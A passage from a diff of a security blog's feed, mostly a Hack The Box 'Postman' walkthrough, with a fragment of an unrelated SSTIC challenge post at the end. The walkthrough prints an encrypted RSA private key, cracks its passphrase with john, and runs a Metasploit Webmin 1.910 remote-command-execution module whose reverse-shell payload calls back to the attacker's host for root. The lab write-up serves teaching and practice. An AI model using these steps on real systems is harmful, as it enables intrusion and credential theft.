+&lt;span class="code-line"&gt;|      .*.=+oo+.+.|&lt;/span&gt;
+&lt;span class="code-line"&gt;|      ..* +oo oo+|&lt;/span&gt;
+&lt;span class="code-line"&gt;|       . +.=.= ..|&lt;/span&gt;
+&lt;span class="code-line"&gt;|      . S +.+ E .|&lt;/span&gt;
+&lt;span class="code-line"&gt;|     o     o   + |&lt;/span&gt;
+&lt;span class="code-line"&gt;|      + . .   . .|&lt;/span&gt;
+&lt;span class="code-line"&gt;|     = o o       |&lt;/span&gt;
+&lt;span class="code-line"&gt;|    o . +.       |&lt;/span&gt;
+&lt;span class="code-line"&gt;+----[SHA256]-----+&lt;/span&gt;
+&lt;span class="code-line"&gt;  Keys Generated Successfully&lt;/span&gt;
+&lt;span class="code-line"&gt;OK&lt;/span&gt;
+&lt;span class="code-line"&gt;OK&lt;/span&gt;
+&lt;span class="code-line"&gt;OK&lt;/span&gt;
+&lt;span class="code-line"&gt;OK&lt;/span&gt;
+&lt;span class="code-line"&gt;OK&lt;/span&gt;
+&lt;span class="code-line"&gt;OK&lt;/span&gt;
+&lt;span class="code-line"&gt;  You&amp;#39;ll get shell in sometime..Thanks for your patience&lt;/span&gt;
+&lt;span class="code-line"&gt;Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-58-generic x86_64)&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;* Documentation:  https://help.ubuntu.com&lt;/span&gt;
+&lt;span class="code-line"&gt;* Management:     https://landscape.canonical.com&lt;/span&gt;
+&lt;span class="code-line"&gt;* Support:        https://ubuntu.com/advantage&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;* Canonical Livepatch is available for installation.&lt;/span&gt;
+&lt;span class="code-line"&gt;  - Reduce system reboots and improve kernel security. Activate at:&lt;/span&gt;
+&lt;span class="code-line"&gt;    https://ubuntu.com/livepatch&lt;/span&gt;
+&lt;span class="code-line"&gt;Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;Last login: Wed Nov 20 15:31:13 2019 from 10.10.14.110&lt;/span&gt;
+&lt;span class="code-line"&gt;redis@Postman:~$&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h1 id="getting-user"&gt;Getting user&lt;/h1&gt;
+&lt;h2 id="enumeration"&gt;Enumeration&lt;/h2&gt;
+&lt;p&gt;We start enumerating. We quickly see that the user is &lt;code&gt;Matt&lt;/code&gt;. Our &lt;code&gt;redis&lt;/code&gt; user
+has a non-empty bash history we can look at.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;redis@Postman:~$ cat .bash_history &lt;/span&gt;
+&lt;span class="code-line"&gt;exit&lt;/span&gt;
+&lt;span class="code-line"&gt;su Matt&lt;/span&gt;
+&lt;span class="code-line"&gt;pwd&lt;/span&gt;
+&lt;span class="code-line"&gt;nano scan.py&lt;/span&gt;
+&lt;span class="code-line"&gt;python scan.py&lt;/span&gt;
+&lt;span class="code-line"&gt;nano scan.py&lt;/span&gt;
+&lt;span class="code-line"&gt;clear&lt;/span&gt;
+&lt;span class="code-line"&gt;nano scan.py&lt;/span&gt;
+&lt;span class="code-line"&gt;clear&lt;/span&gt;
+&lt;span class="code-line"&gt;python scan.py&lt;/span&gt;
+&lt;span class="code-line"&gt;exit&lt;/span&gt;
+&lt;span class="code-line"&gt;exit&lt;/span&gt;
+&lt;span class="code-line"&gt;cat /etc/ssh/sshd_config &lt;/span&gt;
+&lt;span class="code-line"&gt;su Matt&lt;/span&gt;
+&lt;span class="code-line"&gt;clear&lt;/span&gt;
+&lt;span class="code-line"&gt;cd /var/lib/redis&lt;/span&gt;
+&lt;span class="code-line"&gt;su Matt&lt;/span&gt;
+&lt;span class="code-line"&gt;exit&lt;/span&gt;
+&lt;span class="code-line"&gt;cat id_rsa.bak &lt;/span&gt;
+&lt;span class="code-line"&gt;ls -la&lt;/span&gt;
+&lt;span class="code-line"&gt;exit&lt;/span&gt;
+&lt;span class="code-line"&gt;cat id_rsa.bak &lt;/span&gt;
+&lt;span class="code-line"&gt;exit&lt;/span&gt;
+&lt;span class="code-line"&gt;ls -la&lt;/span&gt;
+&lt;span class="code-line"&gt;crontab -l&lt;/span&gt;
+&lt;span class="code-line"&gt;systemctl enable redis-server&lt;/span&gt;
+&lt;span class="code-line"&gt;redis-server&lt;/span&gt;
+&lt;span class="code-line"&gt;ifconfig&lt;/span&gt;
+&lt;span class="code-line"&gt;netstat -a&lt;/span&gt;
+&lt;span class="code-line"&gt;netstat -a&lt;/span&gt;
+&lt;span class="code-line"&gt;netstat -a&lt;/span&gt;
+&lt;span class="code-line"&gt;netstat -a&lt;/span&gt;
+&lt;span class="code-line"&gt;netstat -a &amp;gt; txt&lt;/span&gt;
+&lt;span class="code-line"&gt;exit&lt;/span&gt;
+&lt;span class="code-line"&gt;crontab -l&lt;/span&gt;
+&lt;span class="code-line"&gt;cd ~/&lt;/span&gt;
+&lt;span class="code-line"&gt;ls&lt;/span&gt;
+&lt;span class="code-line"&gt;nano 6379&lt;/span&gt;
+&lt;span class="code-line"&gt;exit&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;When searching for the files mentioned in the history we found that the
+&lt;code&gt;id_rsa.bak&lt;/code&gt; key exist in &lt;code&gt;/opt/&lt;/code&gt; and is an encrypted RSA private key.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;redis@Postman:~$ find / -name &amp;#39;id_rsa.bak&amp;#39; 2&amp;gt; /dev/null^C&lt;/span&gt;
+&lt;span class="code-line"&gt;/opt/id_rsa.bak&lt;/span&gt;
+&lt;span class="code-line"&gt;redis@Postman:~$ cat /opt/id_rsa.bak&lt;/span&gt;
+&lt;span class="code-line"&gt;-----BEGIN RSA PRIVATE KEY-----&lt;/span&gt;
+&lt;span class="code-line"&gt;Proc-Type: 4,ENCRYPTED&lt;/span&gt;
+&lt;span class="code-line"&gt;DEK-Info: DES-EDE3-CBC,73E9CEFBCCF5287C&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;JehA51I17rsCOOVqyWx+C8363IOBYXQ11Ddw/pr3L2A2NDtB7tvsXNyqKDghfQnX&lt;/span&gt;
+&lt;span class="code-line"&gt;cwGJJUD9kKJniJkJzrvF1WepvMNkj9ZItXQzYN8wbjlrku1bJq5xnJX9EUb5I7k2&lt;/span&gt;
+&lt;span class="code-line"&gt;7GsTwsMvKzXkkfEZQaXK/T50s3I4Cdcfbr1dXIyabXLLpZOiZEKvr4+KySjp4ou6&lt;/span&gt;
+&lt;span class="code-line"&gt;cdnCWhzkA/TwJpXG1WeOmMvtCZW1HCButYsNP6BDf78bQGmmlirqRmXfLB92JhT9&lt;/span&gt;
+&lt;span class="code-line"&gt;1u8JzHCJ1zZMG5vaUtvon0qgPx7xeIUO6LAFTozrN9MGWEqBEJ5zMVrrt3TGVkcv&lt;/span&gt;
+&lt;span class="code-line"&gt;EyvlWwks7R/gjxHyUwT+a5LCGGSjVD85LxYutgWxOUKbtWGBbU8yi7YsXlKCwwHP&lt;/span&gt;
+&lt;span class="code-line"&gt;UH7OfQz03VWy+K0aa8Qs+Eyw6X3wbWnue03ng/sLJnJ729zb3kuym8r+hU+9v6VY&lt;/span&gt;
+&lt;span class="code-line"&gt;Sj+QnjVTYjDfnT22jJBUHTV2yrKeAz6CXdFT+xIhxEAiv0m1ZkkyQkWpUiCzyuYK&lt;/span&gt;
+&lt;span class="code-line"&gt;t+MStwWtSt0VJ4U1Na2G3xGPjmrkmjwXvudKC0YN/OBoPPOTaBVD9i6fsoZ6pwnS&lt;/span&gt;
+&lt;span class="code-line"&gt;5Mi8BzrBhdO0wHaDcTYPc3B00CwqAV5MXmkAk2zKL0W2tdVYksKwxKCwGmWlpdke&lt;/span&gt;
+&lt;span class="code-line"&gt;P2JGlp9LWEerMfolbjTSOU5mDePfMQ3fwCO6MPBiqzrrFcPNJr7/McQECb5sf+O6&lt;/span&gt;
+&lt;span class="code-line"&gt;jKE3Jfn0UVE2QVdVK3oEL6DyaBf/W2d/3T7q10Ud7K+4Kd36gxMBf33Ea6+qx3Ge&lt;/span&gt;
+&lt;span class="code-line"&gt;SbJIhksw5TKhd505AiUH2Tn89qNGecVJEbjKeJ/vFZC5YIsQ+9sl89TmJHL74Y3i&lt;/span&gt;
+&lt;span class="code-line"&gt;l3YXDEsQjhZHxX5X/RU02D+AF07p3BSRjhD30cjj0uuWkKowpoo0Y0eblgmd7o2X&lt;/span&gt;
+&lt;span class="code-line"&gt;0VIWrskPK4I7IH5gbkrxVGb/9g/W2ua1C3Nncv3MNcf0nlI117BS/QwNtuTozG8p&lt;/span&gt;
+&lt;span class="code-line"&gt;S9k3li+rYr6f3ma/ULsUnKiZls8SpU+RsaosLGKZ6p2oIe8oRSmlOCsY0ICq7eRR&lt;/span&gt;
+&lt;span class="code-line"&gt;hkuzUuH9z/mBo2tQWh8qvToCSEjg8yNO9z8+LdoN1wQWMPaVwRBjIyxCPHFTJ3u+&lt;/span&gt;
+&lt;span class="code-line"&gt;Zxy0tIPwjCZvxUfYn/K4FVHavvA+b9lopnUCEAERpwIv8+tYofwGVpLVC0DrN58V&lt;/span&gt;
+&lt;span class="code-line"&gt;XTfB2X9sL1oB3hO4mJF0Z3yJ2KZEdYwHGuqNTFagN0gBcyNI2wsxZNzIK26vPrOD&lt;/span&gt;
+&lt;span class="code-line"&gt;b6Bc9UdiWCZqMKUx4aMTLhG5ROjgQGytWf/q7MGrO3cF25k1PEWNyZMqY4WYsZXi&lt;/span&gt;
+&lt;span class="code-line"&gt;WhQFHkFOINwVEOtHakZ/ToYaUQNtRT6pZyHgvjT0mTo0t3jUERsppj1pwbggCGmh&lt;/span&gt;
+&lt;span class="code-line"&gt;KTkmhK+MTaoy89Cg0Xw2J18Dm0o78p6UNrkSue1CsWjEfEIF3NAMEU2o+Ngq92Hm&lt;/span&gt;
+&lt;span class="code-line"&gt;npAFRetvwQ7xukk0rbb6mvF8gSqLQg7WpbZFytgS05TpPZPM0h8tRE8YRdJheWrQ&lt;/span&gt;
+&lt;span class="code-line"&gt;VcNyZH8OHYqES4g2UF62KpttqSwLiiF4utHq+/h5CQwsF+JRg88bnxh2z2BD6i5W&lt;/span&gt;
+&lt;span class="code-line"&gt;X+hK5HPpp6QnjZ8A5ERuUEGaZBEUvGJtPGHjZyLpkytMhTjaOrRNYw==&lt;/span&gt;
+&lt;span class="code-line"&gt;-----END RSA PRIVATE KEY-----&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We copy the key on our computer and use &lt;code&gt;ssh2john&lt;/code&gt; to extract the hash from the
+key and run a john on it: the password is &lt;code&gt;computer2008&lt;/code&gt;.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;python2 /usr/bin/ssh2john redis_rsa &amp;gt; redis_rsa.hash&lt;/span&gt;
+&lt;span class="code-line"&gt;john redis_rsa.hash -w=rockyou.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;computer2008&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;The key does not allow us to connect using the SSH key (the ssh connection
+closed immediately). I also tried this creds for a locally elevation with &lt;code&gt;su&lt;/code&gt;
+and it works… I do not know why the user will have the same password as it
+sshkey passphrase but it works and we get the user flag.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;redis@Postman:~$ su Matt&lt;/span&gt;
+&lt;span class="code-line"&gt;Password: &lt;/span&gt;
+&lt;span class="code-line"&gt;Matt@Postman:/var/lib/redis$ cd&lt;/span&gt;
+&lt;span class="code-line"&gt;Matt@Postman:~$ ls&lt;/span&gt;
+&lt;span class="code-line"&gt;user.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;Matt@Postman:~$ cat user.txt &lt;/span&gt;
+&lt;span class="code-line"&gt;517ad0&amp;lt;redacted&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h1 id="getting-root"&gt;Getting root&lt;/h1&gt;
+&lt;p&gt;The previous creds also work on the webmin authentication form allowing us to
+login an see the webmin version: 1.910.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="webmin dashboard" src="/media/2020.03/postman_1.png"&gt;&lt;/p&gt;
+&lt;p&gt;The exploit for searchsploit should works.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;Webmin 1.910 - &amp;#39;Package Updates&amp;#39; Remote Command Execution (Metasploit)  | exploits/linux/remote/46984.rb&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We import the script in metasploit:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;mkdir ~/.msf/modules/exploits/linux/remote&lt;/span&gt;
+&lt;span class="code-line"&gt;cp /usr/share/exploitdb/exploits/linux/remote/46984.rb&lt;/span&gt;
+&lt;span class="code-line"&gt;updated&lt;/span&gt;
+&lt;span class="code-line"&gt;msfconsole&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We give to metasploit all the needed information (user, password, IPs) and do
+not forget to put the &lt;code&gt;SSL&lt;/code&gt; parameter to &lt;code&gt;true&lt;/code&gt;.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;msf5 exploit(linux/remote/46984) &amp;gt; show options&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;Module options (exploit/linux/remote/46984):&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;  Name       Current Setting  Required  Description&lt;/span&gt;
+&lt;span class="code-line"&gt;  ----       ---------------  --------  -----------&lt;/span&gt;
+&lt;span class="code-line"&gt;  PASSWORD   computer2008     yes       Webmin Password&lt;/span&gt;
+&lt;span class="code-line"&gt;  Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]&lt;/span&gt;
+&lt;span class="code-line"&gt;  RHOSTS     10.10.10.160     yes       The target host(s), range CIDR identifier, or hosts file with syntax &amp;#39;file:&amp;lt;path&amp;gt;&amp;#39;&lt;/span&gt;
+&lt;span class="code-line"&gt;  RPORT      10000            yes       The target port (TCP)&lt;/span&gt;
+&lt;span class="code-line"&gt;  SSL        true             no        Negotiate SSL/TLS for outgoing connections&lt;/span&gt;
+&lt;span class="code-line"&gt;  TARGETURI  /                yes       Base path for Webmin application&lt;/span&gt;
+&lt;span class="code-line"&gt;  USERNAME   Matt             yes       Webmin Username&lt;/span&gt;
+&lt;span class="code-line"&gt;  VHOST                       no        HTTP server virtual host&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;Payload options (cmd/unix/reverse_perl):&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;  Name   Current Setting  Required  Description&lt;/span&gt;
+&lt;span class="code-line"&gt;  ----   ---------------  --------  -----------&lt;/span&gt;
+&lt;span class="code-line"&gt;  LHOST  10.10.14.13      yes       The listen address (an interface may be specified)&lt;/span&gt;
+&lt;span class="code-line"&gt;  LPORT  4444             yes       The listen port&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;Exploit target:&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;  Id  Name&lt;/span&gt;
+&lt;span class="code-line"&gt;  --  ----&lt;/span&gt;
+&lt;span class="code-line"&gt;  0   Webmin &amp;lt;= 1.910&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Then we run the script. We are directly root on the box and get the flag.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;msf5 exploit(linux/remote/46984) &amp;gt; run&lt;/span&gt;
+&lt;span class="code-line"&gt;[*] Started reverse TCP handler on 10.10.14.13:4444 &lt;/span&gt;
+&lt;span class="code-line"&gt;[+] Session cookie: a2ff4450e3a344159ab1fd464db52855&lt;/span&gt;
+&lt;span class="code-line"&gt;[*] Attempting to execute the payload...&lt;/span&gt;
+&lt;span class="code-line"&gt;[*] Command shell session 1 opened (10.10.14.13:4444 -&amp;gt; 10.10.10.160:32916) at 2019-11-20 14:39:02 +0100&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;id&lt;/span&gt;
+&lt;span class="code-line"&gt;uid=0(root) gid=0(root) groups=0(root)&lt;/span&gt;
+&lt;span class="code-line"&gt;cat root.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;cat /root/root.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;a2577&amp;lt;redacted&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h1 id="wrapping-up"&gt;Wrapping up&lt;/h1&gt;
+&lt;p&gt;This box was interesting but not the most interesting one. Moreover the name
+suggested me that there will be some SMTP (or IMAP) involved. I am a bit
+disappointed.&lt;/p&gt;</content><category term="security"></category><category term="security"></category><category term="boot2root"></category><category term="HTB"></category><category term="redis"></category><category term="webmin"></category><category term="linux"></category></entry><entry><title>Vault</title><link href="https://maggick.fr/2020/02/vault.html" rel="alternate"></link><published>2020-02-08T10:35:00+01:00</published><updated>2020-02-08T10:35:00+01:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2020-02-08:/2020/02/vault.html</id><summary type="html">&lt;blockquote&gt;
 &lt;p&gt;"Secure, store and tightly control access to tokens, passwords, certificates, encryption keys for protecting secrets and other sensitive data using a UI, CLI, or HTTP API."&lt;/p&gt;
 &lt;/blockquote&gt;
 </summary><content type="html">&lt;blockquote&gt;
@@ -9043,20 +9431,20 @@ in case):&lt;/p&gt;
 
 &lt;h2 id="strings"&gt;Strings&lt;/h2&gt;
 &lt;p&gt;Let's try something like &lt;code&gt;strings&lt;/code&gt; to see what appends:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;maggick&lt;/span&gt;&lt;span class="nv"&gt;@debian&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="o"&gt;~/&lt;/span&gt;&lt;span class="k"&gt;work&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;sstic&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;strings&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;chlg&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;2015&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;wc&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;l&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;span class="mi"&gt;10797&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;maggick&lt;/span&gt;&lt;span class="p"&gt;@&lt;/span&gt;&lt;span class="n"&gt;debian&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;~/&lt;/span&gt;&lt;span class="n"&gt;work&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;sstic&lt;/span&gt;$ &lt;span class="n"&gt;strings&lt;/span&gt; &lt;span class="n"&gt;chlg&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;2015&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="n"&gt;wc&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;l&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="n"&gt;10797&lt;/span&gt;&lt;/span&gt;
 &lt;span class="code-line"&gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;span class="n"&gt;maggick&lt;/span&gt;&lt;span class="nv"&gt;@debian&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="o"&gt;~/&lt;/span&gt;&lt;span class="k"&gt;work&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;sstic&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;strings&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;chlg&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;2015&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;head&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;span class="n"&gt;Salted__D&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;K&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;span class="n"&gt;vKRbn&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;span class="n"&gt;vKRbn&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;span class="n"&gt;vKRbn&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;span class="n"&gt;vKRbn&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;span class="n"&gt;K5G&lt;/span&gt;&lt;span class="c1"&gt;--9S&lt;/span&gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="n"&gt;Pz&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;span class="n"&gt;vKRbn&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;span class="n"&gt;vKRb&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="s"&gt;maggick@debian:~/work/sstic$&lt;/span&gt; &lt;span class="s"&gt;strings&lt;/span&gt; &lt;span class="s"&gt;chlg-2015&lt;/span&gt; &lt;span class="s"&gt;|&lt;/span&gt; &lt;span class="s"&gt;head&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="n"&gt;Salted__D&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="s"&gt;8&lt;/span&gt;&lt;span class="o"&gt;&amp;#39;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;K&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="n"&gt;vKRbn&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="s"&gt;vKRbn&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="n"&gt;vKRbn&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="s"&gt;vKRbn&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="n"&gt;K5G&lt;/span&gt;&lt;span class="o"&gt;--&lt;/span&gt;9&lt;span class="n"&gt;S&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="c"&gt;%Pz$&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="n"&gt;vKRbn&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="s"&gt;vKRb&lt;/span&gt;&lt;/span&gt;
 &lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
